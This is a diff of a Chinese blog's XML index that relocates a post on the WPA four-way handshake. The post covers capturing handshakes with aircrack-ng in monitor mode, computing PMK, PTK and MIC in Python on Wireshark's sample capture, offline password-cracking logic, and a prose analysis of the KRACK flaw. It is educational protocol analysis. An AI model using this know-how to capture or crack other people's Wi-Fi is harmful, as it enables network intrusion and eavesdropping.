-<p>说明网卡被占用，需要使用<code>airmon-ng check kill</code>命令来结束占用进程：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng check kill</span></span><br><span class="line"></span><br><span class="line">Killing these processes:</span><br><span class="line"></span><br><span class="line">    PID Name</span><br><span class="line">   <span class="number">1989</span> wpa_supplicant</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlan0mon	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里网卡名称会变成<code>wlan0mon</code>，需要注意。</p>
-<p>但是，直接设置后抓包有时只能抓到部分，比如仅有AP侧的数据，设备端的数据包都丢失了，原因是<strong>未指定信道</strong>。此时需要使用<code>airodump-ng</code>工具查看目标AP的信道：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airodump-ng wlan0mon</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629141915808.png" alt="image-20200629141915808"></p>
-<p>上图中第一行所示的信息中，CH表示信道，我们想对该AP进行四次握手的捕获，则需要将网卡监听的信道固定为11：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0mon 11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlan0mon	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line"></span><br><span class="line">		(mac80211 monitor mode already enabled <span class="keyword">for</span> [<span class="type">phy0</span>]wlan0mon on [<span class="type">phy0</span>]<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
-
-<p>看到命令行中最后一行括号里的提示，表示已经设置为固定监听信道11。</p>
-<p>此时打开wireshark，选中网卡wlan0mon即可捕获。</p>
-<h1 id="WPA四次握手"><a href="#WPA四次握手" class="headerlink" title="WPA四次握手"></a>WPA四次握手</h1><p>在上一篇文章《Wi-Fi攻击方式简述》中，已经对WPA的握手过程进行过简单讲解，总结起来WPA的四次握手完成了：</p>
-<p>1）Wi-Fi密码的验证</p>
-<p>2）后续信道加密的密码的确认（注意这里不是“传输”）</p>
-<p>而在其握手过程中，会生成一些过程产物，如加密握手数据的密钥、完整性校验数据等。密钥计算的总览视图如下：</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629154441387.png" alt="image-20200629154441387"></p>
-<p>四次握手的简单示意图：</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/686769-20161117152254170-216963418.png" alt="686769-20161117152254170-216963418"></p>
-<p>接下来会逐步介绍每一步的计算过程。</p>
-<h2 id="握手前的准备：计算PMK"><a href="#握手前的准备：计算PMK" class="headerlink" title="握手前的准备：计算PMK"></a>握手前的准备：计算PMK</h2><p><strong>PMK(Pairwise Master Key)</strong> 是整个WPA认证过程中非常核心的一个密钥，是由Wi-Fi的<code>SSID</code>和<code>Pre-Shared-Key</code>（即Wi-Fi密码）计算而来，其算法被称为Password-Based Key Derivation Function 2 (PBKDF2) ，是一种使用HMAC-SHA1，使用SSID作为盐值来进行哈希的一种算法。</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629170801055.png" alt="image-20200629170801055"></p>
-<p>在默认的Python环境中，需要安装<code>pbkdf2</code>库来支持这种算法，可以使用<code>pip install pbkdf2</code>命令来安装 。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pbkdf2 <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">psk = <span class="string">&quot;Induction&quot;</span></span><br><span class="line">ssid = <span class="string">&quot;Coherer&quot;</span></span><br><span class="line">pmk = PBKDF2(psk, ssid, <span class="number">4096</span>).read(<span class="number">32</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629165810353.png" alt="image-20200629165810353"></p>
-<p>此外，可以利用Linux系统中的<code>wpa_passphrase</code>工具来计算PMK，其命令为：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pentest@DESKTOP<span class="literal">-2AE07FJ</span>:~<span class="variable">$</span> wpa_passphrase Coherer Induction</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629165935651.png" alt="image-20200629165935651"></p>
-<p>这里可以看出来，计算出来的值是一致的。</p>
-<h2 id="第一次握手：传递ANonce，STA计算PTK"><a href="#第一次握手：传递ANonce，STA计算PTK" class="headerlink" title="第一次握手：传递ANonce，STA计算PTK"></a>第一次握手：传递ANonce，STA计算PTK</h2><p>在WPA的第一次握手时，由AP向STA发送<code>ANonce</code>：</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629170336475.png" alt="image-20200629170336475"></p>
-<p>在这个数据包中，除了 <code>ANonce</code> 以外，在头部包含了双方的MAC地址。此时<strong>STA本地生成SNonce，满足了PTK计算的全部条件，因此进行PTK的计算</strong>。</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629171145032.png" alt="image-20200629171145032"></p>
-<p><strong>由于SNonce在第二次握手的数据包中，因此这部分的演示在下一节进行。</strong></p>
-<h2 id="第二次握手：传递SNonce，AP计算PTK"><a href="#第二次握手：传递SNonce，AP计算PTK" class="headerlink" title="第二次握手：传递SNonce，AP计算PTK"></a>第二次握手：传递SNonce，AP计算PTK</h2><p>第二次握手时，STA向AP发送SNonce：</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629171638896.png" alt="image-20200629171638896"></p>
-<p>PTK（Pairwise Transient Key）的计算需要使用<strong>PRF512</strong>算法，其实现是参照《<a href="https://www.shellvoide.com/wifi/understanding-wpa-wpa2-hash-mic-cracking-process-python/">Understanding WPA/WPA2 Hash (MIC) Cracking Process In Python</a>》文章中给出的算法进行：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">customPRF512</span>(<span class="params">key, A, B</span>):</span></span><br><span class="line">    blen = <span class="number">64</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    R = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= ((blen * <span class="number">8</span> + <span class="number">159</span>) / <span class="number">160</span>):</span><br><span class="line">        hmacsha1 = hmac.new(key, A + <span class="built_in">chr</span>(<span class="number">0x00</span>) + B + <span class="built_in">chr</span>(i), hashlib.sha1)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        R = R + hmacsha1.digest()</span><br><span class="line">    <span class="keyword">return</span> R[:blen]</span><br></pre></td></tr></table></figure>
-
-<p>从前两次握手包中提取的<code>ANonce</code>、<code>SNonce</code> 以及双方的MAC地址，拼接起来作为计算PTK的部分：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mac_ap = binascii.unhexlify(<span class="string">&quot;000c4182b255&quot;</span>)</span><br><span class="line">mac_cl = binascii.unhexlify(<span class="string">&quot;000d9382363a&quot;</span>)</span><br><span class="line">anonce = binascii.unhexlify(<span class="string">&quot;3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933&quot;</span>)</span><br><span class="line">snonce = binascii.unhexlify(<span class="string">&quot;cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386&quot;</span>)</span><br><span class="line">key_data = <span class="built_in">min</span>(mac_ap, mac_cl) + <span class="built_in">max</span>(mac_ap, mac_cl) + <span class="built_in">min</span>(anonce,snonce) + <span class="built_in">max</span>(anonce,snonce)</span><br></pre></td></tr></table></figure>
-
-<p><code>PRF512</code>需要3个参数，<code>PMK</code>，<code>PKE</code> 和上面计算出来的 <code>key_data</code>。其中<code>PKE</code>是一个固定字符串，<code>PMK</code>在前文中有过计算：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pke = <span class="string">&quot;Pairwise key expansion&quot;</span></span><br><span class="line">pmk = PBKDF2(<span class="string">&quot;Induction&quot;</span>, <span class="string">&quot;Coherer&quot;</span>, <span class="number">4096</span>).read(<span class="number">32</span>)</span><br><span class="line">ptk = customPRF512(pmk, pke, key_data)</span><br><span class="line"><span class="comment"># 此处ptk的值(Hex String)为：b1cd792716762903f723424cd7d1651182a644133bfa4e0b75d96d230835843315798d511beae0028313c8ab32f12c7ecb71c893482669daaf0e9223fe1c0aed</span></span><br></pre></td></tr></table></figure>
-
-<p>到这里，AP和STA各自都计算出了PTK（正常情况下双方算出的PTK内容是一致的）。</p>
-<h2 id="PTK的构成"><a href="#PTK的构成" class="headerlink" title="PTK的构成"></a>PTK的构成</h2><p>上一步骤中，计算出来的PTK是一个512bit的字符串（64字节），这是由于我们下载的Wireshark官方提供的样例包中的WPA采用的是TKIP加密，如果是CCMP加密，这里的算法会有所区别，因为计算出的PTK应当为384bit。</p>
-<p>此处以TKIP加密为例，512bit的字符串可以分割为3个部分：KCK、KEK 和 TK。</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629191743423.png" alt="image-20200629191743423"></p>
-<p><strong>KCK (Key Confirmation Key)：</strong>用于计算WPA EAPOL密钥消息的MIC（完整性验证）</p>
-<p><strong>KEK (Key Encryption Key)：</strong>用于加密发送到客户端的附加数据（在“密钥数据”字段中）</p>
-<p><strong>TK (Temporal Key)：</strong>用于后续通信数据加密</p>
-<p>TKIP加密模式下，PTK共512bit，其中按顺序为：KCK（128bit），KEK（128bit），TK（256bit）</p>
-<p>CCMP加密模式下，PTK共384bit，其中按顺序为：KCK（128bit），KEK（128bit），TK（128bit）</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200630095341818.png" alt="image-20200630095341818"></p>
-<p>如上节中计算的PTK，按照长度划分，应为：</p>
-<p>KCK = b1cd792716762903f723424cd7d16511</p>
-<p>KEK = 82a644133bfa4e0b75d96d2308358433</p>
-<p>TK = 15798d511beae0028313c8ab32f12c7ecb71c893482669daaf0e9223fe1c0aed</p>
-<h2 id="验证MIC"><a href="#验证MIC" class="headerlink" title="验证MIC"></a>验证MIC</h2><p>比较第一次和第二次握手，在数据包中会发现在<code>WPA Key MIC</code>字段中由原来的全0变成了一串字符：</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629202936492.png" alt="image-20200629202936492"></p>
-<p><strong>MIC (Message Integrity Code)：</strong>消息完整性代码 是校验数据是否被篡改，以及PSK是否正确（因为MIC是由PTK参与计算，PTK由是由PSK生成）。</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200630100306995.png" alt="image-20200630100306995"></p>
-<p>MIC的计算是以KCK为密钥（Key），整个802.1X报文为消息体（Message）进行HMAC运算得出的结果，共128bit。</p>
-<p>顺便一提，WPA的密码离线破解也是利用PSK生成PMK，并根据握手包计算KCK，再生成MIC并对比原数据包中的MIC来确定密码是否正确。</p>
-<p>在我们手工验证的时候，需要先将整个报文（这里以第二次握手为例）提取出来，并找到<code>WPA Key MIC</code>字段，将这部分内容替换成0，再计算。</p>
-<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200630101214680.png" alt="image-20200630101214680"></p>
-<p>这部分代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = binascii.unhexlify(<span class="string">&quot;0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000&quot;</span>)</span><br><span class="line">mic = hmac.new(ptk[<span class="number">0</span>:<span class="number">16</span>], payload, hashlib.sha1).hexdigest()[:<span class="number">32</span>]</span><br></pre></td></tr></table></figure>
-
-<p>至此，大部分的计算和校验任务已经结束。</p>
-<h2 id="第三次握手：传递加密的GTK，STA安装TK"><a href="#第三次握手：传递加密的GTK，STA安装TK" class="headerlink" title="第三次握手：传递加密的GTK，STA安装TK"></a>第三次握手：传递加密的GTK，STA安装TK</h2><p>第三次握手，由AP向STA发送数据，其中MIC部分与上面的计算方式一致。STA接收到数据后，验证MIC通过则说明AP是有效的，双方PMK是一致的。</p>
-<p>同时，在这个数据包中，包含了加密后的GTK。<strong>GTK (Group Temporal Key)</strong> 用于加密广播和多播数据。GTK加密的密钥为KEK，其解密和使用不在此详述。</p>
-<p>当STA接收到第三次握手包并验证MIC通过后，会将计算出来的TK（PTK的最后一段）安装到系统中，作为后续的通信加密密钥。</p>
-<h2 id="第四次握手：AP安装TK"><a href="#第四次握手：AP安装TK" class="headerlink" title="第四次握手：AP安装TK"></a>第四次握手：AP安装TK</h2><p>最后一次握手仅为STA向AP发送的确认信息，表示密钥已经安装完毕，此时AP端也会进行密钥安装，至此，双方的密钥安装全部结束，后续通信中按照前面步骤中的密钥进行通信。</p>
-<h1 id="密钥重装攻击-KRACK-Attack"><a href="#密钥重装攻击-KRACK-Attack" class="headerlink" title="密钥重装攻击 KRACK Attack"></a>密钥重装攻击 KRACK Attack</h1><p>上文中简单梳理了一下WPA四次握手的过程，其中省略了一些部分。由于主要是想帮助对KRACK漏洞的理解，因此重点放在第三次握手的密钥安装部分，安装的密钥来源上。</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>关于这一漏洞，感兴趣的可以参考《<a href="https://www.freebuf.com/articles/wireless/150953.html">WPA2 密钥重装攻击 KRACK Attacks 分析报告</a>》，个人感觉这篇文章解释的比较详细，总结起来这个漏洞就是：</p>
-<blockquote>
-    其中，wpa_supplicant 2.4及2.5版本实现了协议注释内容“一旦安装后，就可从内存中清除加密密钥”，将导致客户端会安装值全为零的秘钥。因此使用了这些wpa_supplicant版本的Linux及Android设备将遭受严重威胁。
-</blockquote>
-
-<p>这个漏洞是利用wpa_supplicant在第三次握手时对TK的处理来达到攻击的目的的。由于TK是根据第一次和第二次握手包中的数据生成，因此STA会将该密钥保存在本地的内存中。当收到第三次握手的数据包时，STA会将该密钥安装，并从内存中清除（“一旦安装后，就可从内存中清除加密密钥”），因此再次收到该握手包时，程序会再次加载这部分已被清零的内存，导致重新安装的密钥为全0。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于目前未找到直接的利用EXP/POC，在Github上有一个检测工具：<a href="https://github.com/vanhoefm/krackattacks-scripts%EF%BC%8C%E5%85%B6%E5%AE%98%E7%BD%91">https://github.com/vanhoefm/krackattacks-scripts，其官网</a> <a href="https://www.krackattacks.com/">https://www.krackattacks.com</a> 上有对这个漏洞的演示。</p>
-<p>从原理和演示来看，KRACK漏洞需要搭建Rogue AP做中间人，转发握手数据帧。当发送第三次握手包时，进行重放。</p>
-<p>由于多次接收到第三次握手包，STA会尝试安装全0的密钥，并使用密钥加密后续通信包。Rogue AP的通信密钥预先就被置为0，这样就可以正常的和STA通信。</p>
-<p>目前没有时间来实践这个漏洞，仅从原理上对漏洞的利用方式进行分析，该漏洞更像是传统的Evil Twin的攻击方法，但Evil Twin需要知道目标AP的密码，才能让用户的设备顺利连入；而借助KRACK Attack，攻击者无需知道目标AP的密码即可实现中间人攻击，监听受害者流量。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>WPA的四次握手中，前两次是在互相交换计算PTK的信息（ANonce、SNonce），AP验证STA身份（利用MIC）并各自计算出PTK；第三次握手STA验证了AP的身份，传输加密GTK，并将计算出的TK安装；第四次握手确认密钥安装完成。</p>
-<p>附：完整的计算MIC的 Python 代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pbkdf2 <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">import</span> hmac, binascii, hmac, hashlib, sha</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">customPRF512</span>(<span class="params">key, A, B</span>):</span></span><br><span class="line">    blen = <span class="number">64</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    R = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= ((blen * <span class="number">8</span> + <span class="number">159</span>) / <span class="number">160</span>):</span><br><span class="line">        hmacsha1 = hmac.new(key, A + <span class="built_in">chr</span>(<span class="number">0x00</span>) + B + <span class="built_in">chr</span>(i), sha)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        R = R + hmacsha1.digest()</span><br><span class="line">    <span class="keyword">return</span> R[:blen]</span><br><span class="line"></span><br><span class="line">psk = <span class="string">&quot;Induction&quot;</span></span><br><span class="line">ssid = <span class="string">&quot;Coherer&quot;</span></span><br><span class="line">pmk = PBKDF2(psk, ssid, <span class="number">4096</span>).read(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">mac_ap = binascii.unhexlify(<span class="string">&quot;000c4182b255&quot;</span>)</span><br><span class="line">mac_cl = binascii.unhexlify(<span class="string">&quot;000d9382363a&quot;</span>)</span><br><span class="line">anonce = binascii.unhexlify(<span class="string">&quot;3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933&quot;</span>)</span><br><span class="line">snonce = binascii.unhexlify(<span class="string">&quot;cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386&quot;</span>)</span><br><span class="line"></span><br><span class="line">key_data = <span class="built_in">min</span>(mac_ap, mac_cl) + <span class="built_in">max</span>(mac_ap, mac_cl) + <span class="built_in">min</span>(anonce,snonce) + <span class="built_in">max</span>(anonce,snonce)</span><br><span class="line">pke = <span class="string">&quot;Pairwise key expansion&quot;</span></span><br><span class="line">ptk = customPRF512(pmk, pke, key_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;PTK Original:                &quot;</span>,ptk.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;EAPOL-Key Confirm Key:       &quot;</span>,ptk[:<span class="number">16</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;EAPOL-Key Encrypt Key:       &quot;</span>,ptk[<span class="number">16</span>:<span class="number">32</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(TKIP|CCMP) Temporal Key:    &quot;</span>,ptk[<span class="number">32</span>:].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = binascii.unhexlify(<span class="string">&quot;0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000&quot;</span>)</span><br><span class="line"></span><br><span class="line">mic = hmac.new(ptk[<span class="number">0</span>:<span class="number">16</span>], payload, hashlib.sha1).hexdigest()[:<span class="number">32</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;MIC (Message Integrity Code):&quot;</span>,mic</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>参考链接</strong></p>
-<p>[1] <a href="WPA/RSN%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8CPTK">WPA/RSN四次握手和PTK</a></p>
-<p>[2] <a href="https://dalewifisec.wordpress.com/2013/06/03/keys-keys-and-even-more-keys/">KEYS, KEYS, AND EVEN MORE KEYS!</a></p>
-<p>[3] <a href="WPA/WPA2-PSK%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B">WPA/WPA2-PSK认证过程</a></p>
-<p>[4] <a href="https://www.jianshu.com/p/392362718d68">四次握手</a></p>
-<p>[5] <a href="https://www.cnblogs.com/efzju/p/3199330.html">安全协议系列（二）—-CCM与CCMP</a></p>
-<p>[6] <a href="https://www.krackattacks.com/">https://www.krackattacks.com/</a></p>
-<p>[7] <a href="https://github.com/vanhoefm/krackattacks-scripts">https://github.com/vanhoefm/krackattacks-scripts</a></p>
-<p>[8] <a href="https://www.freebuf.com/articles/wireless/153255.html">国内研究人员首次Wifi重大漏洞利用实现 | Krack攻击测试套件打包</a></p>
-<p>[9] <a href="https://www.freebuf.com/articles/wireless/150953.html">WPA2 密钥重装攻击 KRACK Attacks 分析报告</a></p>
-<p>[10] <a href="https://www.shellvoide.com/wifi/understanding-wpa-wpa2-hash-mic-cracking-process-python/">Understanding WPA/WPA2 Hash (MIC) Cracking Process In Python</a></p>
-<p>[11] <a href="https://wiki.wireshark.org/HowToDecrypt802.11">HowToDecrypt802.11</a></p>
-]]></content>
-      <tags>
-        <tag>Python</tag>
-        <tag>Wi-Fi</tag>
-        <tag>WPA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Wi-Fi攻击方式简述</title>
     <url>/2020/06/05/Wi-Fi%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E7%AE%80%E8%BF%B0/</url>
     <content><![CDATA[<p>Wi-Fi安全是一个老生常谈的问题了，各种攻击方式也被总结的很多了，但大部分都在说原理和流程，很少有深入到细节分析的。</p>
@@ -1869,6 +1732,143 @@ http://challenge01.root-me.org/web-serveur/ch52/?url=https://baidu.com&h=bb6e082
       </tags>
   </entry>
   <entry>
+    <title>WPA四次握手过程解析</title>
+    <url>/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<p>最近在梳理Wi-Fi的攻击方式，又看到了17年的KRACK漏洞。当时只是看了漏洞的原理和危害，并没有理解漏洞的成因和为什么被利用。本文尝试结合Python代码来理解一下WPA四次握手的过程，以及尝试分析一下KRACK漏洞。</p>
+<span id="more"></span>
+
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>在正式开始分析之前，先要准备一下软件和分析对象。</p>
+<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><p>本次使用的操作系统是Windows10 1909，部分需要Linux的使用虚拟机安装的Kali进行。</p>
+<p>代码部分，解释器版本为Python 2.7。</p>
+<p>数据包分析工具使用经典的Wireshark。</p>
+<h2 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h2><p>由于不同的加密方法和参数对握手包的影响较大，因此分析对象使用了Wireshark官方给出的WPA数据包。</p>
+<p>该数据包可以在<a href="https://wiki.wireshark.org/HowToDecrypt802.11%E9%A1%B5%E9%9D%A2%E4%B8%8A%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%EF%BC%9A">https://wiki.wireshark.org/HowToDecrypt802.11页面上进行下载：</a></p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629105537200.png" alt="image-20200629105537200"></p>
+<p>额外说明一下，如果想自己捕获设备的WPA握手包，则需要额外的软件，并将网卡置为<code>Monitor Mode</code>。下面简单介绍一下。</p>
+<h2 id="手动捕获握手包"><a href="#手动捕获握手包" class="headerlink" title="手动捕获握手包"></a>手动捕获握手包</h2><p><strong>Windows平台</strong>：在Windows平台下想要捕获802.11管理帧，需要使用微软官方的软件<a href="https://www.microsoft.com/en-us/download/details.aspx?id=4865">Microsoft Network Monitor</a>。它的安装和使用也相对比较方便，网上也有相当多的教程，如《<a href="https://cstriker1407.info/blog/windows-80211-frame/">windows下抓取802.11管理包</a>》。有一点需要注意，该软件在“扫描设置（Scanning Options）”中开启<code>Monitor Mode</code>后，该窗口不能关闭，否则会退出：</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/20150905181951_10373.png" alt="img"></p>
+<p><strong>Linux平台</strong>：在Linux平台下，可以借助我们熟悉的<code>aircrack-ng</code>套件来设置网卡的<code>Monitor Mode</code>，并使用<code>Wireshrak</code>来获取和查看数据。此处以Kali为例，其他Linux系统可以自行安装相关套件。</p>
+<p>设置监听模式的命令为：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>wlan0</code>是网卡的名称。若出现以下情况：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0</span></span><br><span class="line"></span><br><span class="line">Found <span class="number">2</span> processes that could cause trouble.</span><br><span class="line"><span class="keyword">If</span> airodump<span class="literal">-ng</span>, aireplay<span class="literal">-ng</span> or airtun<span class="literal">-ng</span> stops working after</span><br><span class="line">a short period of time, you may want to run <span class="string">&#x27;airmon-ng check kill&#x27;</span></span><br><span class="line"></span><br><span class="line">    PID Name</span><br><span class="line">   <span class="number">1959</span> NetworkManager</span><br><span class="line">   <span class="number">1989</span> wpa_supplicant</span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlan0		rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line"></span><br><span class="line">		(mac80211 monitor mode vif enabled <span class="keyword">for</span> [<span class="type">phy0</span>]wlan0 on [<span class="type">phy0</span>]wlan0mon)</span><br><span class="line">		(mac80211 station mode vif disabled <span class="keyword">for</span> [<span class="type">phy0</span>]wlan0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>说明网卡被占用，需要使用<code>airmon-ng check kill</code>命令来结束占用进程：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng check kill</span></span><br><span class="line"></span><br><span class="line">Killing these processes:</span><br><span class="line"></span><br><span class="line">    PID Name</span><br><span class="line">   <span class="number">1989</span> wpa_supplicant</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlan0mon	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里网卡名称会变成<code>wlan0mon</code>，需要注意。</p>
+<p>但是，直接设置后抓包有时只能抓到部分，比如仅有AP侧的数据，设备端的数据包都丢失了，原因是<strong>未指定信道</strong>。此时需要使用<code>airodump-ng</code>工具查看目标AP的信道：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airodump-ng wlan0mon</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629141915808.png" alt="image-20200629141915808"></p>
+<p>上图中第一行所示的信息中，CH表示信道，我们想对该AP进行四次握手的捕获，则需要将网卡监听的信道固定为11：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># airmon-ng start wlan0mon 11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line"></span><br><span class="line">phy0	wlan0mon	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br><span class="line"></span><br><span class="line">		(mac80211 monitor mode already enabled <span class="keyword">for</span> [<span class="type">phy0</span>]wlan0mon on [<span class="type">phy0</span>]<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看到命令行中最后一行括号里的提示，表示已经设置为固定监听信道11。</p>
+<p>此时打开wireshark，选中网卡wlan0mon即可捕获。</p>
